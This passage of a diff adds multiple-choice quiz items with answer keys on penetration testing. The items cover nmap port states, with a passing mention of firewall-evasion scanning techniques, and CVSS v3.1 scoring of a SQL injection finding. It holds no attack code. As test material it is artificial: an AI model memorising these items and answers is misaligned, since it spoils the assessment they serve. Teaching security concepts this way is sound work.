+      - "nmap cannot determine if the port is open because a firewall or filter is silently dropping or blocking the probe packets — no response is received"
+      - "The port was open during a previous scan but is now closed"
+      - "The port is closed and the host sent a TCP RST in response to the probe"
+    answer: 1
+    explanation: "nmap reports three primary port states: 'open' (service is listening and accepting connections — SYN-ACK received), 'closed' (no service listening, host sent TCP RST), and 'filtered' (probe packets are dropped by a firewall or filter — no response, or ICMP unreachable received). Filtered ports are common indicators of firewall rules. From a pentester's perspective, 'filtered' doesn't mean the service isn't there — it may mean a firewall is protecting it, warranting further investigation (e.g., trying different source ports, fragmented packets, or decoy scanning)."
+
+  - question: "A penetration tester is preparing a report for a financial services client. They successfully performed a SQL injection attack on the login page of the client's customer portal, retrieved 50 sample rows of customer data from a test account, and achieved remote code execution. According to CVSS v3.1 scoring, which metrics most significantly elevate this finding to Critical (9.0+) severity?"
+    options:
+      - "Attack Vector: Physical and Attack Complexity: High — because physical access was needed to run the SQL injection"
+      - "Attack Vector: Network, Attack Complexity: Low, Privileges Required: None, User Interaction: None, with High impacts on Confidentiality, Integrity, and Availability"
+      - "Privileges Required: High and User Interaction: Required — because the attacker needed admin access"
+      - "Scope: Unchanged and Availability Impact: None — because no services were disrupted"
+    answer: 1
+    explanation: "A CVSS v3.1 Critical score (9.0-10.0) requires: AV:N (network-exploitable remotely), AC:L (no special conditions), PR:N (no authentication required), UI:N (no user interaction needed), and High impacts across C/I/A. The SQL injection on a public login page satisfies all these: it is remotely exploitable without any authentication, requires no user interaction, and achieving RCE with data access means full High impact on Confidentiality (data read), Integrity (database write/RCE), and Availability (service disruption possible). This vector AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H calculates to CVSS 10.0."
